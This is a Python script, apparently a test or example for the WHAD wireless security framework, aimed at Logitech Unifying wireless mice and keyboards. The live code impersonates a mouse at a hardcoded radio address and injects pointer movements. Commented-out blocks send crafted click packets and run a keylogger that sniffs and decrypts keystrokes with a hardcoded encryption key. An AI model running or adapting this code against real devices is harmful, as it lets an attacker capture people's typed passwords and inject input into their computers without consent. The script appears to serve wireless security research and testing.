from whad.unifying import Keylogger, Mouselogger, Mouse
from whad.device import WhadDevice
from whad.exceptions import WhadDeviceNotFound
from whad.scapy.layers.esb import *
from whad.scapy.layers.unifying import *
from scapy.compat import raw
import sys,time

def show(pkt):
    print(repr(pkt))

if __name__ == '__main__':
    if len(sys.argv) >= 2:
        # Retrieve target interface
        interface = sys.argv[1]

        # Connect to target device and performs discovery
        try:
            dev = WhadDevice.create(interface)

            connector = Mouse(dev)
            connector.attach_callback(show, on_reception=True, on_transmission=True)
            connector.start()
            connector.channel = 5
            connector.address = "ca:e9:06:ec:a4"
            connector.synchronize()
            '''
            pid = 0
            while True:
                connector.send(ESB_Hdr(address=connector.address, pid=pid)/ESB_Payload_Hdr()/Logitech_Unifying_Hdr()/Logitech_Mouse_Payload(button_mask=2), channel=5)
                input()
                pid = (pid + 1) % 4

            exit()
            '''
            #connector.synchronize()

            #for _ in range(5):
            #    connector.stack.ll.send_data(ESB_Hdr(b"\244\321\244\006\000\001\001\001\000\000\000\000\000\000\000\000\000\000\000\000\000\336"))
            #    time.sleep(0.1)
            #input()
            while True:
                connector.move(20, -1)
                input()
            '''
            while True:
                print("move")
                time.sleep(0.1)

            connector = Keylogger(dev)
            connector.address = "9b:0a:90:42:8c"
            connector.scanning = True
            connector.decrypt = True

            connector.add_key(bytes.fromhex("08f59b42da6fdc9bcd88654d5f19400d"))
            connector.start()
            out = ""
            for i in connector.sniff():
                out += i
                print(out)
            '''
            while True:
                input()

        except (KeyboardInterrupt, SystemExit):
            dev.close()

        except WhadDeviceNotFound:
            print('[e] Device not found')
            exit(1)
    else:
        print('Usage: %s [device]' % sys.argv[0])
